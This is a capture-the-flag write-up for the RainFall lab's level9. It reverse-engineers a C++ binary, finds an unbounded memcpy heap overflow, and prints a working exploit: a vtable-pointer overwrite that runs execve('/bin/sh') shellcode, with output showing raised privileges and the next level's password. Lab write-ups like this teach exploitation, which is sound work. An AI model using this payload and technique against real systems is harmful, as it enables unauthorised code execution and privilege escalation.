# level9 - Heap Exploit

On `level9`'s HOME, we find a binary named : `level9`

```shell
...
0x08048530  operator new(unsigned int)
0x08048530  _Znwj@plt
...
0x080485f4  main
...
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
...
```

let's disassemble `main()` function:

```shell
(gdb) disass main
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:	mov    ebp,esp
   0x080485f7 <+3>:	push   ebx
   0x080485f8 <+4>:	and    esp,0xfffffff0
   0x080485fb <+7>:	sub    esp,0x20
   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    ebx,eax
   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    ebx,eax
   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>:	add    eax,0x4
   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx
   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:	leave
   0x08048699 <+165>:	ret
End of assembler dump.
(gdb) disass 0x080486f6			# N::N(int)
Dump of assembler code for function _ZN1NC2Ei:
   0x080486f6 <+0>:	push   ebp
   0x080486f7 <+1>:	mov    ebp,esp
   0x080486f9 <+3>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080486fc <+6>:	mov    DWORD PTR [eax],0x8048848
   0x08048702 <+12>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]
   0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx
   0x0804870b <+21>:	pop    ebp
   0x0804870c <+22>:	ret
End of assembler dump.
(gdb) disass 0x0804870e			# N::setAnnotation(char*)
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   ebp
   0x0804870f <+1>:	mov    ebp,esp
   0x08048711 <+3>:	sub    esp,0x18
   0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048717 <+9>:	mov    DWORD PTR [esp],eax
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]
   0x08048722 <+20>:	add    edx,0x4
   0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax
   0x08048730 <+34>:	mov    DWORD PTR [esp],edx
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave  
   0x08048739 <+43>:	ret    
End of assembler dump.
(gdb) disass 0x0804873a			# N::operator+(N&) 
Dump of assembler code for function _ZN1NplERS_:
   0x0804873a <+0>:	push   ebp
   0x0804873b <+1>:	mov    ebp,esp
   0x0804873d <+3>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048740 <+6>:	mov    edx,DWORD PTR [eax+0x68]
   0x08048743 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048746 <+12>:	mov    eax,DWORD PTR [eax+0x68]
   0x08048749 <+15>:	add    eax,edx
   0x0804874b <+17>:	pop    ebp
   0x0804874c <+18>:	ret    
End of assembler dump.
(gdb) disass 0x0804874e			# N::operator-(N&)
Dump of assembler code for function _ZN1NmiERS_:
   0x0804874e <+0>:	push   ebp
   0x0804874f <+1>:	mov    ebp,esp
   0x08048751 <+3>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048754 <+6>:	mov    edx,DWORD PTR [eax+0x68]
   0x08048757 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804875a <+12>:	mov    eax,DWORD PTR [eax+0x68]
   0x0804875d <+15>:	mov    ecx,edx
   0x0804875f <+17>:	sub    ecx,eax
   0x08048761 <+19>:	mov    eax,ecx
   0x08048763 <+21>:	pop    ebp
   0x08048764 <+22>:	ret    
End of assembler dump.
```

<br>

After decompiling it using gdb, we build this code in C language:

```shell
>$ cat source 
#include <cstring>

class N {

	public:

		N( int value ) { 
			this->n = value;
		}

		size_t operator+( N &rhs ) {
			return rhs.n + this->n;
		}

		N operator-( N &rhs ) {
			return this->n - rhs.n;
		}

		void setAnnotation( char *str ) {
			memcpy(this->str, str, strlen(str));
		}

	private:

		char str[104];
		int n;

};


int main(int ac, char **av) {

	if (ac == 1)
		exit(1);

	N first(5); // 0x0804a008 => second.str : 0x0804a00c
	N second(6);  // 0x0804a078

	first.setAnnotation(av[1]);
	second + first;

	return (0);

}
```

We can see that to exploit this binary, we can exploit a heap buffer
overflow. From the code, we see that the strings input as first argument is 
copied in function `N::setAnnotation(char*)` using `memcpy()` to the string present 
in the corresponding instance of class N.

<br>

Let's check emplacement (pointer) of each instance created, 

```shell
(gdb) b *0x0804861c
Breakpoint 1 at 0x804861c
(gdb) b *0x0804863e
Breakpoint 2 at 0x804863e
(gdb) b * 0x08048674
...
Starting program: /home/user/level9/level9 test

Breakpoint 1, 0x0804861c in main ()
(gdb) x/x $eax
0x804a008:	0x00000000					# N first(5);
(gdb) c
Continuing.

Breakpoint 2, 0x0804863e in main ()
(gdb) x/x $eax
0x804a078:	0x00000000					# N second(6);
```

So, there are **112 bytes** (*0x70*) between these to instances. And in more
detail, by looking at the functions `N::operator(N&)` and `N::setAnnotation(char*)`
we understand the mapping of private variables in this memory space:

- `N+0x4` = **N.str**
- `N+0x68` = **N.n**

<br>

We can look now on which corresponding instance is called `N::setAnnotation(char*)`:

```shell
(gdb) b * 0x08048674
Breakpoint 3 at 0x8048674
(gdb) c
Continuing.

Breakpoint 3, 0x08048674 in main ()
(gdb) x/x $eax
0x804a008:	0x08048848				# first.setAnnotation(av[1]);
```

<br>

To exploit this binary we will use the call to the functon `N::operator(N&)` on
this line :

```shell
first + second;
```

this line is associated to these assembly code lines:

```shell
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]		# retrieve pointer to second instance.
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]			# dereference first time previous ptr
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]			# dereferemce second time previous ptr and stores it to edx
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx							# call function pointer
```

This knowing we can find a diagram to exploit :

- **N instance ptr** -> **ptr intermediate** -> **ptr to N::operator+(N&)**

So, if we rewrite the pointer to the **second** instance, we can redirect the
execution as explained in this diagram:

- **Redirect to input string beginning** -> **Redirect to begin+0x4** -> **shellcode** 

<br>

So our *112 bytes* payload (108 bytes to fill the *first* instance space +
4 bytes to rewrite pointer to *second* instance) will be:

- **first+0x8** : `\x08\x04\xa0\x10`
- Our shellcode (check [level2](https://github.com/A-Mahla/Security-Pentest-Part-III/tree/main/level2) for explaination) -> `\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80`
- NOP instruction -> `\x90 * 79`
- **first+0x4** : `\x08\x04\xa0\x0c`




<br>

We can now exploit this BOF :

```shell
./level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + b"\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80" + "\x90" * 79 + "\x08\x04\xa0\x0c"[::-1]')
```

```shell
level9@RainFall:~$ ./level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + b"\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80" + "\x90" * 79 + "\x08\x04\xa0\x0c"[::-1]')
$ id
uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
$ cat /home/user/bonus0/.pass    
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
